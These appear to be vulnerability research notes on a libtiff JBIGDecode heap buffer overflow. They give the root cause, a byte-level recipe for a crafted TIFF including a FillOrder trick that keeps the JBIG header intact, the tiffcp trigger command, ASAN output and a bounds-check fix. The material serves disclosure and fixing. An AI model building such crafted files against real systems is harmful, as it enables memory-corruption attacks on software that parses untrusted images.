# VULN-001: JBIGDecode heap buffer overflow – Analysis Notes

## Vulnerability summary

| Field | Value |
|---|---|
| CWE | CWE-122 – Heap-Based Buffer Overflow |
| File | `libtiff/libtiff/tif_jbig.c` |
| Function | `JBIGDecode()` |
| Overflow site | Line 125 – `_TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder))` |

## Root cause (two-line analysis)

```c
// tif_jbig.c, JBIGDecode()
static int JBIGDecode(TIFF* tif, tidata_t buffer, tsize_t size, tsample_t s)
{
    ...
    (void) size, (void) s;           // ← line 82: caller-supplied buffer size DISCARDED

    ...
    decodeStatus = jbg_dec_in(&decoder, tif->tif_rawdata, tif->tif_rawdatasize, NULL);
    if (JBG_EOK != decodeStatus) { return 0; }

    pImage = jbg_dec_getimage(&decoder, 0);
    _TIFFmemcpy(buffer, pImage, jbg_dec_getsize(&decoder));  // ← line 125: size from BIE header
    ...
}
```

`buffer` is allocated by libtiff based on the IFD tags `ImageWidth` and `ImageLength`.
`jbg_dec_getsize()` returns the decoded image size based on the `X_D` / `Y_D` fields inside
the JBIG BIE (Binary Image Entity) header, which is part of the strip data – fully
attacker-controlled. If an attacker sets small IFD dimensions but large BIE dimensions,
`_TIFFmemcpy` overflows the heap allocation.

## Crafted file structure

```
[TIFF header – 8 bytes]
  'II'        little-endian marker
  42          magic number
  8           offset to IFD

[IFD – 126 bytes]
  10 entries (sorted by tag):
    ImageWidth            (0x0100) = 8          ← small: drives buffer alloc
    ImageLength           (0x0101) = 8          ← small: drives buffer alloc
    BitsPerSample         (0x0102) = 1          (bilevel)
    Compression           (0x0103) = 34661      (COMPRESSION_JBIG = 0x8765)
    PhotometricInterp     (0x0106) = 1          (BlackIsZero)
    FillOrder             (0x010A) = 2          ← LSB2MSB: prevents JBIGDecode's
                                                   internal TIFFReverseBits call
    StripOffsets          (0x0111) = 134        → points to BIE below
    SamplesPerPixel       (0x0115) = 1
    RowsPerStrip          (0x0116) = 8          = ImageLength → 1 strip (required)
    StripByteCounts       (0x0117) = 1024

[Strip data @ offset 134]
  Valid JBIG BIE for a 256x256 all-white image (24 bytes) + zero padding to 1024:
    BIE header byte 4-7:  X_D = 256  (big-endian)  ← large: drives memcpy size
    BIE header byte 8-11: Y_D = 256  (big-endian)  ← large: drives memcpy size
    ...remainder: valid arithmetic-coded stripe data (produced by libjbig)
    ...zero padding to 1024 bytes (= TIFFroundup(24, 1024))
```

## Overflow arithmetic

| Quantity | Value |
|---|---|
| Buffer allocated | `ceil(8 × 1 / 8) × 8 = 8 bytes` |
| `jbg_dec_getsize()` | `ceil(256 / 8) × 256 × 1 = 8192 bytes` |
| Overflow past buffer | **8184 bytes** |

## Call chain (correct trigger)

```
tiffcp -c none poc.tif out.tif
  └─ cpDecodedStrips()                 (tools/tiffcp.c)
       └─ TIFFReadEncodedStrip()
            └─ TIFFFillStrip()
                 └─ [reads 1024 raw bytes from file; TIFF_NOBITREV=1, no reversal here]
            └─ JBIGDecode()            (libtiff/tif_jbig.c, line 77)
                 ├─ isFillOrder(tif, td_fillorder=LSB2MSB=2) → FALSE (due to FillOrder tag)
                 │    → TIFFReverseBits NOT called → BIE intact
                 ├─ jbg_dec_init(&decoder)
                 ├─ jbg_newlen(rawdata, 1024)  [returns JBG_EINVAL, ignored]
                 ├─ jbg_dec_in(&decoder, rawdata, 1024, NULL) → JBG_EOK
                 │    (void) size              ← bug: 8-byte buffer size thrown away
                 └─ _TIFFmemcpy(buffer,        ← 8-byte heap allocation
                                pImage,        ← 8192-byte decoded image
                                8192)          ← 8184-byte heap overflow ← ASAN fires
```

## Critical pre-condition: FillOrder tag

Without the `FillOrder=2` tag, `JBIGDecode` (lines 84-87 of tif_jbig.c) calls
`TIFFReverseBits(tif->tif_rawdata, tif->tif_rawdatasize)` because
`isFillOrder(tif, FILLORDER_MSB2LSB=1)` always returns TRUE on x86 (tif_flags is
initialized to `FILLORDER_MSB2LSB = 1` at `TIFFClientOpen`).

This bit-reversal scrambles every byte of the BIE header, corrupting X_D, Y_D, and
the arithmetic-coded stripe data. After reversal:
- BIH byte 6 (BIE header X_D high byte) changes: `0x01` → `0x80` (bit-reversed)
- `jbg_dec_in` parses the corrupted BIH and computes an invalid geometry → returns
  `JBG_ENOMEM` (48) because the maxmem check trips on garbage dimensions.

Adding `FillOrder=2` (FILLORDER_LSB2MSB) in the IFD causes:
- `isFillOrder(tif, 2)` = `(tif_flags & 2) = 0` → FALSE → no TIFFReverseBits call.
- TIFFFillStrip: `!isFillOrder(tif, 2) = TRUE` but `TIFF_NOBITREV` is set → no reversal.
- Net result: BIE reaches jbg_dec_in byte-for-byte as written.

## Trigger tool: tiffcp, not tiffsplit

`tiffsplit` does NOT trigger the vulnerability. Its `cpStrips()` function calls
`TIFFReadRawStrip()` (line 251 of `tools/tiffsplit.c`), which copies the raw encoded
strip without invoking any codec. `JBIGDecode` is never called.

The correct trigger is `tiffcp -c none`, which uses `cpDecodedStrips()` →
`TIFFReadEncodedStrip()` → codec decode path → `JBIGDecode()`.

## ASAN observed output (excerpt)

```
==<pid>==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x... at pc 0x...
WRITE of size 8192 at 0x... thread T0
    #0 ... in __interceptor_memcpy
    #1 ... in _TIFFmemcpy
    #2 ... in JBIGDecode tif_jbig.c:125
    #3 ... in TIFFReadEncodedStrip
    #4 ... in cpDecodedStrips tiffcp.c
    #5 ... in tiffcp

0x... is located 0 bytes to the right of 8-byte region [0x..., 0x...)
allocated by thread T0 here:
    #0 ... in __interceptor_malloc
    #1 ... in _TIFFmalloc
    #2 ... in cpDecodedStrips
```

(Confirmed with actual ASAN build on this system.)

## PoC files

| File | Purpose |
|---|---|
| `vuln_001_gen.py` | Generates `poc.tif` using ctypes + libjbig.so.0 |
| `run.sh` | Runs the full PoC end-to-end (uses `tiffcp -c none`) |
| `poc.tif` | The crafted TIFF (produced by the generator) |

## libjbig availability check

Confirmed present at build time (libtiff linked against `libjbig.so.0`):
```
$ ldd /data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffcp | grep jbig
        libjbig.so.0 => /lib/x86_64-linux-gnu/libjbig.so.0
```

`JBIG_SUPPORT` is compiled in; `TIFFInitJBIG` is present in `libtiff.so`.

## Fix (reference only)

Replace the discarded-size pattern with a bounds check before memcpy:

```c
// Proposed fix in JBIGDecode():
size_t decoded_size = jbg_dec_getsize(&decoder);
if (decoded_size > (size_t)size) {
    TIFFError("JBIG", "Decoded image size %zu exceeds buffer %zu",
              decoded_size, (size_t)size);
    jbg_dec_free(&decoder);
    return 0;
}
_TIFFmemcpy(buffer, pImage, decoded_size);
```
